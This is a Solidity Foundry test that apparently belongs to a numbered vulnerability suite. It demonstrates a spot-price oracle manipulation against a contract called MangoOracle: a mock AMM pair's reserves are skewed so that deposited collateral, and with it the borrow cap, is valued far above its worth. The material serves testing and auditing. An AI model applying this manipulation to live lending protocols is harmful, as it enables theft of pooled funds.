// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract MockPair016 is IAmmPair {
    uint112 public r0;
    uint112 public r1;

    function set(uint112 _r0, uint112 _r1) external {
        r0 = _r0;
        r1 = _r1;
    }

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32) {
        return (r0, r1, 0);
    }
}

contract Exploit_016_mango_oracle is Test {
    function testExploit_ManipulatedSpotInflatesBorrowCap() public {
        MockPair016 pair = new MockPair016();
        pair.set(1000, 1000); // spot = 1

        MangoOracle m = new MangoOracle(address(pair));
        vm.deal(address(m), 100 ether);

        m.depositCollateral(100);
        uint256 normalCap = (m.collateralValue(address(this)) * 7500) / 10000;

        pair.set(10, 5000); // spot = 500x
        uint256 pumpedCap = (m.collateralValue(address(this)) * 7500) / 10000;

        assertGt(pumpedCap, normalCap * 100, "spot manipulation should drastically inflate cap");
    }
}
